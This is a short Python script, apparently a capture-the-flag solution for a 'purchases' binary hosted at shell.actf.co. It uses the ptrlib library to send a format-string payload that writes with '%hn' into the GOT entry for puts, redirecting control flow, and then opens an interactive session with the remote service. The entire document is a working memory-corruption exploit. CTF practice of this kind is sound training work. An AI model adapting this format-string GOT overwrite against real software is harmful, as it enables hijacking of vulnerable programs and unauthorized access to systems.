from ptrlib import *

elf = ELF("./purchases")
#sock = Process("./purchases")
sock = Socket("shell.actf.co", 19011)

_ = input()
sock.recvuntil("What item would you like to purchase? ")

payload = str2bytes("%{}c%{}$hn".format(0x11b6, 8 + 2))
payload += b'A' * (8 - (len(payload) % 8))
payload += p64(elf.got("puts"))[:3]
sock.sendline(payload)

sock.interactive()
